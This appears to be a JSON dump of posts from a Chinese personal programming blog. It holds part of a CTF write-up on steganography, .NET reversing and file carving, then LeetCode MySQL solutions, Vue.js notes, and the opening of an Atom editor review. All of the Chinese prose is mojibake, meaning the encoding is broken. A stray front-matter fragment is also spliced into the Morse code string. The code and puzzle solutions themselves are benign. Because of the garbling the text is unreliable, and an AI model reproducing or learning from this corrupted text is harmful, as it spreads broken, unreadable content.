ç”¨éšä¾¿ä»€ä¹ˆé¬¼æ‰“å¼€ï¼ˆæ¥ä¹‹å‰è§è¯†è¿‡è¿™ä¸ªè„‘æ´ï¼Œä¸“é—¨å‡†å¤‡çš„ Sonic Visualiser, ç„¶è€Œå¡ä½äº†æ²¡æœ‰ç”¨ä¸Šï¼‰ï¼Œå‘ç°é‡Œé¢æœ‰å››ä¸ªå£°é“ï¼Œä¸‹é¢ä¸¤ä¸ªå£°é“åƒæ˜¯ä¸ªæ–¹æ³¢ã€‚ç„¶åä¸€ç‚¹ä¸€ç‚¹æ•° 01 æ•°å‡ºæ¥ï¼Œå¾—åˆ°ï¼š011011100111010101100001011000010110001101110100011001100111101101110011011010000011000001110010011101000101111101100110001100010100000101100111æ•°æ ¼å­æ•°çš„çœ¼éƒ½è¦èŠ±äº†â€¦æ¯ä¸€è¡Œ 8 ä½äºŒè¿›åˆ¶è½¬ ASCII ç ï¼Œå¾—åˆ° flag nuaactf{sh0rt_f1Ag, å°‘äº†ä¸€ä¸ªå³æ‹¬å·ğŸ˜‚çœŸæ˜¯å¹¸äº flag çŸ­â€¦é¡ºä¾¿è¯´ä¸€å¥ï¼Œé‚£ä¸ªéŸ³é¢‘çœŸå¥½å¬ï¼Œå¬è¯´æ˜¯é”¤å­æ‰‹æœºçš„é»˜è®¤é“ƒå£°ğŸ˜³ Rev 3ä¸å–œæ¬¢å†™ç•Œé¢çš„ç™½èœå“¥.NET é€†å‘ï¼Œç›´æ¥æ‹–åˆ° IDA é‡Œé¢ï¼Œä¸€é˜µä¹±ç¿»ï¼Œç¿»åˆ°äº†ä¸‰æ®µ base64 å’Œä¸€ä¸ªæ‘©å°”æ–¯ç”µç è¡¨ã€‚æŠŠä¸‰æ®µ base64 æ‹¼èµ·æ¥ä»¥å decode, å¾—åˆ°ä¸€æ®µæ‘©å°”æ–¯ç”µç  `-. â€¦- .- .- -.-. - â€¦-. 2D3f â€¦ .- .â€“. .â€“. -.-- -.-. .-. .- -.-. -â€¦- .toc: true---- -. --. -.-. â€¦ â€¦ .- .-. .â€“. -â€¦â€“.-(2D3f æ˜¯ä»€ä¹ˆé¬¼:joy:)ï¼Œè§£ç åå¾—åˆ° flagNUAACTF{SAPPYCRACK1NGCSSARP}`ï¼Œæ”¾åˆ°æºç¨‹åºé‡Œé¢ï¼Œæ˜¾ç¤º flag æ­£ç¡®ã€‚ç„¶åï¼Œæäº¤ä»¥åè¯´ flag ä¸å¯¹ï¼ä¸ºä»€ä¹ˆ flag ä¸æ˜¯ Happy Cracking CSharp? çœ‹äº†åŠå¤©ï¼Œåˆäº¤äº†åŠå¤©çš„ flagï¼Œæ²¡æ‰¾å‡ºé—®é¢˜ã€‚åæ¥å‘ç°ç¨‹åºç¼–ç è¡¨é‡Œé¢ H å’Œ S çš„ç¼–ç ä¸€æ ·ğŸ˜‚ æ‰€ä»¥é‡Œé¢æ‰€æœ‰çš„ S æ¢æˆ Hï¼Œæºç¨‹åºéƒ½ä¼šæç¤º flag æ­£ç¡®â€¦æŠŠ H å’Œ S è½¬æ¢ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæœ€åè¯•å‡ºæ¥ flag æ˜¯ NUAACTF{HAPPYCRACK1NGCHHARP}ï¼Œä¹Ÿæ˜¯é†‰äººã€‚ Pwn 1ä¹±ç ï¼ä¹±ç ï¼ç­¾åˆ°é¢˜ã€‚ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª txtï¼Œæ‰“å¼€ä»¥åå‘ç°æ˜¯ jsfuckï¼Œæ”¾åˆ°æµè§ˆå™¨é‡Œè¿è¡Œå¾—åˆ° flag. Pwn 2 ï¼ˆæœªè§£å‡ºï¼‰å›å®¶çš„è·¯CTF ç«èµ›è€ƒäº†ç®—æ³•â€¦æœ€çŸ­è·¯â€¦çœŸæ˜¯é†‰é†‰å“’ã€‚ä¸€å¼€å§‹æ²¡æœ‰ç»†æƒ³ï¼Œçå†™äº†ä¸€ä¸ªæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œå‡ºæ¥å¥½å¤šè§£ï¼Œç„¶è€Œæ²¡æœ‰ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œä¹Ÿæ˜¯æ‚²å‚¬ã€‚åˆ°æœ€åä¹Ÿæ²¡æœ‰åšã€‚ Misc 1å¥‡æ€ªçš„å‹ç¼©åŒ…å˜›ï¼Œéšå†™çš„é¢˜éƒ½è›®å¥½ç©å“’ğŸ˜œmisc1.rar ä¸‹è½½ä¸‹æ¥åæ— æ³•æ‰“å¼€ï¼Œfile ä¸€ä¸‹å‘ç°æ˜¯ä¸ª PNGï¼Œæ”¹æ‹“å±•ååæ‰“å¼€ï¼Œå¾—åˆ° flagã€‚è¿™ä¸ªä¹Ÿç®—ç­¾åˆ°é¢˜å§ã€‚ Misc 2å¥‡æ€ªçš„å›¾ç‰‡ä¸‹è½½ misc2.png, pngcheck æç¤º additional data after IEND chunk, çœ‹æ¥æœ€åä¸€å—åé¢è¿˜æœ‰ä¸œè¥¿ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œå‘ç°æ–‡ä»¶æœ€åç”¨æ˜æ–‡å†™ç€ key.åˆšåˆšåœ¨æ–‡ä»¶æœ«å°¾å‘ç°äº†ä¸€ä¸ªæ–‡ä»¶å¤´ PK\\x03\\x04, è§‰å¾—åº”è¯¥æ˜¯ä¸ª zip æ–‡ä»¶ï¼Œbinwalk ä¸€ä¸‹ç„¶åç”¨ dd åˆ†å¼€ï¼Œå¾—åˆ°ä¸€ä¸ª zip æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag. è¿™åº”è¯¥æ˜¯è¿™ä¸ªé¢˜çš„æ ‡å‡†åšæ³•å§ï¼Œåªæ˜¯ä¸ºä»€ä¹ˆåš zip æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰å‹ç¼©ğŸŒš Misc 3æ›´å¥‡æ€ªçš„å›¾ç‰‡ï¼ˆä½ ä»¬è¿™èµ·çš„éƒ½æ˜¯ä»€ä¹ˆåå­—ï¼‰ä¸‹è½½ä¸‹æ¥ï¼ˆå¬è¯´è¿™æ˜¯èˆ°å¨˜ï¼Ÿï¼‰ï¼Œpngcheck æ²¡æœ‰é”™è¯¯ï¼Œå¡äº†ä¸€ä¼šã€‚åæ¥ç”¨ PS æ‰“å¼€ï¼ŒæŠŠè‰²é˜¶æ‹‰ä½ï¼Œå‘ç°å›¾çš„å·¦ä¸‹è§’æœ‰ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾— QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay.è§£ç åå‘ç°æ˜¯ä¹±ç ï¼Œä¸çŸ¥é“æ€ä¹ˆåšäº†ï¼Œå¡äº†å¾ˆä¹…ğŸ˜· æ¯”èµ›çš„æœ€åä¸€ä¸ªå°æ—¶çœ‹è§äº†è§£ç åå­—ç¬¦ä¸²å¼€å¤´çš„ BZï¼Œçªç„¶æ„è¯†åˆ°è¿™å¯èƒ½æ˜¯ä¸ªæ–‡ä»¶å¤´ï¼Œäºæ˜¯å°†è§£ç åçš„å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œfile ä¸€ä¸‹å‘ç°æœç„¶æ˜¯ä¸ª bz å‹ç¼©æ–‡ä»¶ï¼Œè§£å‹åå¾—åˆ° flag. Misc 4 ï¼ˆæœªè§£å‡ºï¼‰è®¨åŒçš„ APPè§…åŠ¨æ ¡å›­ä»€ä¹ˆé¬¼ï¼Ÿï¼ æ€»ç»“æ¯”èµ›äº”ä¸ªå°æ—¶ï¼Œè§£äº† 10 é“é¢˜ï¼Œå‰åŠå°æ—¶è§£å‡ºæ¥ 5 é“ï¼Œåé¢å„ç§å¡ï¼Œæœ€åä¸€ä¸ªå°æ—¶è„‘æ´å¤§å¼€åˆè§£å‡ºæ¥ 3 é“é¢˜ğŸ˜‚CTF çœŸå¥½ç©ï¼Œè€ƒåˆ°äº†å„ç§å§¿åŠ¿å„ç§è„‘æ´ï¼Œè¿˜æ˜¯è›®æœ‰æ„æ€å“’~ç„¶è€Œäº”ä¸ªå°æ—¶çš„æ¯”èµ›çœŸçš„å¤ªç´¯äº†â€¦è¡€çš„æ•™è®­ï¼Œä¸‹æ¬¡é¢˜ç›®åšä¸å‡ºæ¥è¿˜æ˜¯è¦è·‘å‡ºå»æ­‡ä¸€ä¼šå†å›æ¥åš_(:Ğ·ã‚âˆ )_","categories":[{"name":"ä¹±ä¸ƒå…«ç³Ÿ","slug":"ä¹±ä¸ƒå…«ç³Ÿ","permalink":"https://blog.stdioa.com/categories/ä¹±ä¸ƒå…«ç³Ÿ/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.stdioa.com/tags/CTF/"},{"name":"è„‘æ´","slug":"è„‘æ´","permalink":"https://blog.stdioa.com/tags/è„‘æ´/"},{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"}]},{"title":"LeetCode æ•°æ®åº“é¢˜ç›®è§£ç­”","slug":"leetcode-database-solutions","date":"2016-04-06T08:02:00.000Z","updated":"2018-07-15T04:32:30.066Z","comments":true,"path":"2016/04/leetcode-database-solutions/","link":"","permalink":"https://blog.stdioa.com/2016/04/leetcode-database-solutions/","excerpt":"å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚","text":"å‰ä¸¤å¤©é‡åˆ·äº†ã€ŠSQLå¿…çŸ¥å¿…ä¼šã€‹ï¼Œæ˜¨å¤©æƒ³åˆ°äº† LeetCodeï¼Œäºæ˜¯å»åˆ·äº†å‡ é“æ•°æ®åº“çš„é¢˜ç›®ï¼Œå¼€äº†ä¸å°‘è„‘æ´ã€‚ä»Šå¤©æŠŠç­”æ¡ˆæ•´ç†ä¸€ä¸‹ã€‚å–”ï¼Œé¢˜åº“åœ¨è¿™é‡Œã€‚ 175. Combine Two Tableshttps://leetcode.com/problems/combine-two-tables/æ ·ä¾‹ä¸­æœ‰äº›äººçš„ PersonId æ— æ³•åœ¨ Address è¡¨ä¸­æ‰¾åˆ°ï¼Œæ‰€ä»¥ä½¿ç”¨ LEFT JOIN.1234SELECT FirstName, LastName, City, StateFROM PersonLEFT JOIN AddressON Person.PersonId = Address.PersonId; 176. Second Highest Salaryhttps://leetcode.com/problems/second-highest-salary/UNION æŸ¥è¯¢ï¼Œåœ¨ç»“æœçš„æœ€åæ·»åŠ ä¸€ä¸ª NULL, è‹¥ä¸å­˜åœ¨ç¬¬äºŒé«˜çš„è–ªæ°´åˆ™ä¼šé€‰æ‹© NULL.12345SELECT Salary FROM EmployeeUNIONSELECT NULLORDER BY Salary DESCLIMIT 1, 1; 177. Nth Highest Salaryhttps://leetcode.com/problems/nth-highest-salary/è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨ LIMIT 1, N-1ï¼Œæ‰€ä»¥ç”¨äº† IF å‡½æ•°ã€‚12345678910111213CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN RETURN ( # Write your MySQL query statement below SELECT IF(COUNT(*) &gt;= N, MIN(rank.Salary), NULL) FROM ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N ) AS rank );END 178. Rank Scoreshttps://leetcode.com/problems/rank-scores/1234567SELECT Score, ( SELECT COUNT(DISTINCT Score) FROM Scores AS c WHERE o.Score &lt;= c.Score # ç»Ÿè®¡æ¯”å·²é€‰åˆ†æ•°å°çš„åˆ†æ•°ä¸ªæ•°) AS RankFROM Scores AS oORDER BY Score DESC; 180. Consecutive Numbershttps://leetcode.com/problems/consecutive-numbers/æš´åŠ›æŸ¥è¯¢ğŸ˜‚1234SELECT DISTINCT l1.Num AS ConsecutiveNumsFROM Logs AS l1, Logs AS l2, Logs AS l3WHERE l1.Id+1 = l2.Id AND l2.Id+1 = l3.Id AND l1.Num = l2.Num AND l2.Num = l3.Num; 181. Employees Earning More Than Their Managershttps://leetcode.com/problems/employees-earning-more-than-their-managers/é€‰æ‹©é›‡å‘˜ï¼Œæ ¹æ® ManagerId æ‰¾åˆ°é›‡å‘˜ä¸Šå¸çš„è–ªæ°´ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒå³å¯ã€‚1234567SELECT NameFROM EmployeeWHERE Salary &gt; ( SELECT Salary FROM Employee AS e WHERE e.id = Employee.ManagerId ); 182. Duplicate Emailshttps://leetcode.com/problems/duplicate-emails/æŒ‰ Email å­—æ®µè¿›è¡Œåˆ†ç±»ï¼Œä½¿ç”¨ HAVING ç­›é€‰å‡ºç›¸åŒ Email æ•°é‡å¤§äº 1 çš„é¡¹ã€‚123SELECT Email FROM PersonGROUP BY EmailHAVING COUNT(Email)&gt;1; 183. Customers Who Never Orderhttps://leetcode.com/problems/customers-who-never-order/è¿™ä¸ªä¹Ÿæ˜¯ç›´æ¥æŸ¥è¯¢â€¦12345SELECT c.Name AS CustomersFROM Customers AS cWHERE (SELECT COUNT(*) FROM Orders WHERE c.id = Orders.CustomerId) = 0; 184. Department Highest Salaryhttps://leetcode.com/problems/department-highest-salary/åŸºæœ¬ä¸Šå°±æ˜¯ç›´æ¥æŸ¥è¯¢ï¼Œæ³¨æ„ WHERE è¯­å¥ä¸­åˆ¤åˆ«æ¡ä»¶çš„ä½ç½®ï¼Œå¦åˆ™æœ‰å¯èƒ½ TLEğŸ˜‚12345678SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND e.Salary = (SELECT MAX(e2.Salary) FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId); 185. Department Top Three Salarieshttps://leetcode.com/problems/department-top-three-salaries/è¾“å‡ºæ¯ä¸ªéƒ¨é—¨è–ªèµ„æœ€é«˜çš„ä¸‰ä¸ªäººã€‚è¿™ä¸ªé¢˜é‡Œæœ‰ä¸ªå‘ï¼Œå¦‚æœä¸¤ä¸ªäººè–ªèµ„ç›¸åŒï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäººå¹¶åˆ—ï¼Œéƒ½è¦è¾“å‡ºã€‚å¹¶ä¸”å¦‚æœå››ä¸ªäººçš„è–ªèµ„ä¸º 3 2 2 1ï¼Œ è–ªèµ„ä¸º 1 çš„é‚£ä¸ªäººæ’ç¬¬ 3 ğŸ˜‚12345678910SELECT d.Name AS Department, e.Name AS Employee, e.SalaryFROM Employee AS e, Department AS dWHERE e.DepartmentId = d.Id AND (SELECT COUNT(DISTINCT e2.Salary) # æ’åºæ—¶å…è®¸å¹¶åˆ— FROM Employee AS e2 WHERE e.DepartmentId = e2.DepartmentId AND e.Salary &lt; e2.Salary) &lt; 3 # æ¯”è¯¥é›‡å‘˜å·¥èµ„é«˜çš„äººå°‘äºä¸‰ä¸ªORDER BY Department, Salary DESC; 196. Delete Duplicate Emailshttps://leetcode.com/problems/delete-duplicate-emails/MySQL ä¸å…è®¸åœ¨åˆ é™¤æ—¶ä¾æ®å¾…åˆ é™¤çš„è¡¨è¿›è¡Œç­›é€‰ (You canâ€™t specify target tableâ€™Personâ€™ for update in FROM clause), æ‰€ä»¥è¦ç»•ä¸€ä¸‹ã€‚123456789101112131415# é”™çš„ï¼ï¼DELETE FROM PersonWHERE Id IN (SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id );DELETE FROM PersonWHERE Id IN (SELECT * FROM( # ç»•ä¸€ä¸‹ï¼Œå…ˆæŒ‘å‡ºæ‰€æœ‰æ»¡è¶³è¦æ±‚çš„ ID æ„æˆä¸€ä¸ªè¡¨ï¼Œå†ä»è¿™ä¸ªè¡¨ä¸­é€‰ Id è¿›è¡Œåˆ é™¤ SELECT p2.Id FROM Person AS p1, Person AS p2 WHERE p1.Email = p2.Email AND p1.Id &lt; p2.Id) AS temp ); 197. Rising Temperaturehttps://leetcode.com/problems/rising-temperature/ä¸»è¦è€ƒ MySQL çš„æ—¥æœŸæ“ä½œå‡½æ•°ã€‚1234SELECT w1.Id AS IdFROM Weather AS w1, Weather AS w2WHERE datediff(w1.Date, w2.Date) = 1 AND w1.Temperature &gt; w2.Temperature; 262. Trips and Usershttps://leetcode.com/problems/trips-and-users/å¤ªä¹±äº†ï¼Œæ²¡åšğŸ˜¥ åè®°æ˜¨å¤©èŠ±äº†åŠå¤©å†™å®Œè¿™äº›é¢˜ï¼Œå†™åˆ°æœ€åéƒ½ä¸çŸ¥é“è‡ªå·±åœ¨å†™ä»€ä¹ˆäº†ğŸ˜‚ä¸è¿‡è¿˜æ˜¯æŒæ¡äº†ä¸å°‘çš„ SQL æŸ¥è¯¢æŠ€å·§ï¼Œæ¯”å¦‚ UNION SELECT NULL ç­‰ç­‰ã€‚","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/categories/LeetCode/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://blog.stdioa.com/tags/LeetCode/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://blog.stdioa.com/tags/æ•°æ®åº“/"},{"name":"SQL","slug":"SQL","permalink":"https://blog.stdioa.com/tags/SQL/"}]},{"title":"éšæ‰‹è®°ä¹‹Vue.js","slug":"essay-vue","date":"2016-03-28T13:40:03.000Z","updated":"2018-07-12T00:15:02.653Z","comments":true,"path":"2016/03/essay-vue/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-vue/","excerpt":"ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚","text":"ä¹‹å‰çš„é‚£é—¨ JS å’Œå‰ç«¯è¯¾ç»“è¯¾äº†ï¼Œæœ€åèŠ±äº†ä¸€å‘¨æ—¶é—´å†™äº†ä¸€ä¸ª projectï¼Œä½¿ç”¨ Vue.js çš„ä¸€å¥—å·¥å…·å†™äº†ä¸€ä¸ªå•é¡µé¢åº”ç”¨ï¼Œå…ˆå°†ä½¿ç”¨åˆ°åŠå­¦åˆ°çš„çŸ¥è¯†æ¥æ•´ç†ä¸€ä¸‹ã€‚æƒ³äº†æƒ³ï¼Œä¹‹å‰è‡ªå·±å­¦ä¹  Vue.js çš„æ—¶å€™ä¸€ç›´åœ¨ç¿»æ–‡æ¡£ï¼Œç¿»åˆ°å“ªäº›è®©äººçœ¼å‰ä¸€äº®çš„åŠŸèƒ½æ—¶å°±å°†å®ƒåŠ è¿›è‡ªå·±çš„é¡¹ç›®é‡Œï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç³»ç»Ÿåœ°è¿›è¡Œå­¦ä¹ ï¼Œæ‰€ä»¥æƒ³åˆ°å“ªå†™åˆ°å“ªå¥½äº†ã€‚å‰æ–¹é«˜ä¹±é¢„è­¦ã€‚ 1. Vue.jsä¹‹å‰ç”¨ React ç”¨å¾—æœ‰äº›ä¸çˆ½äº†æ‰€ä»¥æƒ³æ¢æ¢å£å‘³, äºæ˜¯ ç”¨Vue.js å†™äº†ä¸€ä¸ªå°åº”ç”¨çš„å‰ç«¯éƒ¨åˆ†ã€‚å®ƒçš„è½»é‡ä»¥åŠMVVMæ¶æ„è®©æˆ‘åœ¨ä¸¤å¤©ä¹‹å†…çˆ±ä¸Šäº†å®ƒï¼Œäºæ˜¯å†³å®šç”¨å®ƒä»£æ›¿ React å»å®Œæˆ final project çš„å‰ç«¯éƒ¨åˆ†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘è§‰å¾— Vue.js æ¯” React æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ‰€ä»¥å¾ˆå¿«å°±å­¦ä¼šäº†å®ƒã€‚æƒ³äº†æƒ³ç¡®å®ä¸çŸ¥é“è¯¥æ•´ç†ä¸€äº›ä»€ä¹ˆï¼Œå› ä¸º Vue çš„å®˜æ–¹æ•™ç¨‹å†™çš„ç¡®å®å¾ˆç›´ç™½æ¸…æ¥šï¼Œæ‰€ä»¥åœ¨æ­¤ä¸å†èµ˜è¿°ï¼Œæœ‰æ—¶é—´çš„è¯å¯èƒ½ä¼šè€ƒè™‘å†™ä¸€ä¸ª Vue çš„æ•™ç¨‹ã€‚ 2. vue-clivue-cli æ˜¯ä¸€ä¸ª Vue.js å®˜æ–¹æä¾›çš„è„šæ‰‹æ¶å·¥å…·ï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è½»æ¾åœ°æ„å»ºå‡ºä¸€ä¸ªåº”ç”¨ Vue.js çš„å·¥ç¨‹ã€‚å®˜æ–¹æä¾› 5 ç§æ¨¡æ¿ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨ github ä¸Šæˆ–è€…æœ¬åœ°æ„å»ºè‡ªå·±çš„æ¨¡æ¿ç„¶åä½¿ç”¨ vue-cli ç”Ÿæˆå·¥ç¨‹ã€‚å…·ä½“ä½¿ç”¨æ–¹æ³•ï¼šç”Ÿæˆä¸€ä¸ªå·¥ç¨‹æä¸ºç®€å•ï¼Œåªéœ€ä¸€ä¸¤æ¡å‘½ä»¤å³å¯ã€‚1234$ vue init webpack my-project // ä½¿ç”¨ webpack æ¨¡æ¿ç”Ÿæˆå·¥ç¨‹ my-project$ cd my-project$ npm install$ npm run devç„¶åï¼Œå€ŸåŠ© webpack ä¸ vue-loader, ä½ å¯ä»¥å°†ä¸€ä¸ª Vue ç»„ä»¶çš„æ¨¡æ¿ã€æ ¸å¿ƒjsä»£ç å’ŒCSSå†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç”šè‡³è¿˜å¯ä»¥ä½¿ç”¨ CSS ä¸ HTML çš„é¢„å¤„ç†å™¨ï¼Œåƒè¿™æ ·ï¼šå›¾ç‰‡æ¥è‡ª Vue.js å®˜æ–¹æ•™ç¨‹ - æ„å»ºå¤§å‹åº”ç”¨ã€‚ 3. Vue-routervue-router æ˜¯ vue å®˜æ–¹æä¾›çš„è·¯ç”±æ¨¡å—ï¼Œå¯ä»¥å®ç° SPA ä¸­çš„è·¯ç”±æ“ä½œã€‚å…·ä½“æ–‡æ¡£çœ‹è¿™é‡Œã€‚é¡ºä¾¿æä¸€å¥ï¼Œvue-router çš„ä¸­æ–‡æ–‡æ¡£å·²ç»è¿‡æ—¶äº†ã€‚ 3.1 åˆå§‹åŒ–é¦–å…ˆä½¿ç”¨ npm å®‰è£… vue-router, ç„¶ååœ¨ç¨‹åºå…¥å£ç‚¹é…ç½® vue-router.12345678910111213141516171819202122232425262728import Vue from 'vue'import Router from 'vue-router'import App from './components/App' // ç¨‹åºçš„æ ¸å¿ƒ Vue åº”ç”¨import HomePageView from './components/HomePageView' // å¯¼å…¥æ‰€æœ‰çš„ View ç»„ä»¶import ItemView from './components/ItemView' Vue.use(Router) // Vue é…ç½®var router = new Router() // ç”Ÿæˆè·¯ç”±å¯¹è±¡router.map(&#123; // é…ç½®è·¯ç”± '/': &#123; name: 'homepage', component: HomePageView &#125;, '/home': &#123; name: 'homepage', component: HomePageView &#125;, '/item/:id': &#123; // æ”¯æŒåŠ¨æ€è·¯å¾„ name: 'item', component: ItemView &#125;&#125; router.redirect(&#123; // è®¾ç½®é‡å®šå‘é€‰é¡¹ '*': '/home'&#125;) router.start(App, '[app]') // æŒ‚è½½ Vue ä¸»åº”ç”¨ç„¶ååœ¨ App.vue çš„ template ä¸­è®¾ç½® router-view.1234567&lt;template&gt; &lt;router-view keep-alive transition=\"fade\" transition-mode=\"out-in\"&gt; &lt;/router-view&gt;&lt;/template&gt; 3.2 vue-router çš„ä½¿ç”¨Vue Router å¯¹è±¡è¢«åµŒå…¥åˆ°æ¯ä¸ª vue ç»„ä»¶ä¸­ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­è°ƒç”¨ this.$router æ¥æ§åˆ¶ router å¯¹è±¡ï¼Œå¦‚è¿›è¡Œé¡µé¢è·³è½¬ç­‰ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥åœ¨é¡µé¢åˆ‡æ¢æ—¶åœ¨ç»„ä»¶çš„ route é…ç½®ä¸­ä½¿ç”¨è·¯ç”±åˆ‡æ¢é’©å­æ§åˆ¶ vue-routerï¼Œè¯¦æƒ…è¯·çœ‹æ–‡æ¡£ 4. VuexVuex æ˜¯ä¸€ä¸ªå€Ÿé‰´äº Fluxï¼Œä½†æ˜¯ä¸“é—¨ä¸º Vue.js æ‰€è®¾è®¡çš„çŠ¶æ€ç®¡ç†æ–¹æ¡ˆã€‚Flux é‡‡ç”¨äº† Action â†’ Dispatcher â†’ Store â†’ View çš„çŠ¶æ€ç®¡ç†æœºåˆ¶ï¼Œè€Œ Vuex è·Ÿå®ƒå·®ä¸å¤šï¼šVue ç»„ä»¶è°ƒç”¨ actionï¼Œaction dispatches mutation, mutation æ”¹å˜ store ä¸­çš„ stateï¼Œstate æ”¹å˜ View. ä¸‹é¢æ˜¯ Vuex çš„æ•°æ®æµã€‚ 4.1 ä½¿ç”¨æ–¹æ³•ç¨‹åºå…¥å£ç‚¹ï¼š123import Vuex from 'vuex'Vue.use(Vuex)ä¸»åº”ç”¨ï¼š123456import store from '../store'export default &#123; store, // å¼•ç”¨store ...&#125;å…¶å®ƒç»„ä»¶ï¼š123456789101112131415161718export default &#123; ..., vuex: &#123; // å®šä¹‰ getter ä» store ä¸­è·å– state å¹¶æ³¨å†Œè‡³åº”ç”¨ä¸­ getters: &#123; logged_in: function (state) &#123; return state.user.logged_in &#125; &#125;, // å®šä¹‰ action, ç»„ä»¶å¯åœ¨è‡ªå·±çš„å‡½æ•°ä¸­è°ƒç”¨ action æ¥ dispatch mutations. actions: &#123; login: (&#123; dispatch &#125;, user) =&gt; &#123; dispatch('LOGIN', user) &#125; &#125; &#125;, ...&#125;å…³äº store åŠ mutation çš„å®šä¹‰æ–¹å¼ï¼Œè¯·å‚è€ƒ Vuex æ–‡æ¡£ã€‚ 5. æ€»ç»“ &amp; åè®°è·Ÿ React ç›¸æ¯”ï¼Œä¸ªäººæ„Ÿè§‰ Vue è¦æ›´å®¹æ˜“ä¸Šæ‰‹ï¼Œæ˜“äºä½¿ç”¨ï¼Œæ–‡æ¡£ä¹Ÿå¾ˆæ¸…æ¥šï¼ˆæ¯” Hexo çš„é«˜åˆ°ä¸çŸ¥é“é‚£é‡Œå»äº†ï¼Œå‰ä¸¤å¤©è¢« Hexo æ•´ç–¯äº†å¿…é¡»è¦é»‘ä¸€ä¸‹å®ƒï¼‰ï¼›Vue çš„ä¸€ç³»åˆ—å·¥å…·ä¹Ÿå¾ˆæ˜“äºä½¿ç”¨ï¼Œä¸ Vue æ•´åˆåº¦é«˜ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­æ–¹ä¾¿åœ°è¿›è¡Œæ“ä½œã€‚å‰ç«¯è¯¾ç»“è¯¾ï¼Œå‡†å¤‡é€€å‘äº†ï¼Œè¿‡å‡ å¤©å¯èƒ½ä¼šå­¦ä¹ å¹¶æ•´ç†ä¸€äº›åç«¯çš„çŸ¥è¯†ã€‚","categories":[{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/categories/Javascript/"}],"tags":[{"name":"å‰ç«¯å¼€å‘","slug":"å‰ç«¯å¼€å‘","permalink":"https://blog.stdioa.com/tags/å‰ç«¯å¼€å‘/"},{"name":"Javascript","slug":"Javascript","permalink":"https://blog.stdioa.com/tags/Javascript/"},{"name":"node.js","slug":"node-js","permalink":"https://blog.stdioa.com/tags/node-js/"},{"name":"vue.js","slug":"vue-js","permalink":"https://blog.stdioa.com/tags/vue-js/"}]},{"title":"Atom æµ…åº¦ä½“éªŒæ„Ÿå—","slug":"essay-atom-using-experience","date":"2016-03-27T02:40:03.000Z","updated":"2018-07-12T00:15:06.013Z","comments":true,"path":"2016/03/essay-atom-using-experience/","link":"","permalink":"https://blog.stdioa.com/2016/03/essay-atom-using-experience/","excerpt":"æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ Atom Flight Manual, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚","text":"æ˜¨å¤©çœ‹åˆ°äº† Atom å®˜æ–¹å‘å¸ƒäº†ä¸€ç¯‡ Atom Flight Manual, çœ‹äº†ä¸¤é¡µè§‰å¾—æœ‰äº›æ„Ÿå…´è¶£æ‰€ä»¥ä¸‹äº†ä¸€ä¸ªä½“éªŒä¸€ä¸‹ã€‚å¾ˆä¹…ä»¥å‰å°±å¬è¯´äº† Atom è¿™æ¬¾ç¼–è¾‘å™¨ï¼ŒGithub å®£ç§°å®ƒæ˜¯&quot;A hackable text editorfor the 21st Century&quot;, æœ‰äº›æ„Ÿå…´è¶£äºæ˜¯å°±æäº†ä¸€ä¸ªå†…æµ‹ç 